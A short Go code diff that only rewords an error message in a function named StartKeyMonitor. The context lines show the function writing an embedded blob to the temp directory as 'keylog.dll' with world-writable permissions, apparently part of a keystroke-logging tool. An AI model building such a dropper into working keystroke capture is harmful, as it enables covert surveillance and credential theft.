@@ -37,7 +37,7 @@ func StartKeyMonitor() error {
 	tmp := os.TempDir()
 	fp := filepath.Join(tmp, "keylog.dll")
 	if err := os.RemoveAll(fp); err != nil {
-		fmt.Println(err)
+		fmt.Println("failed to remove keylog path", err)
 	}
 	if err := os.WriteFile(fp, keylogDLL, 0777); err != nil {
 		return err
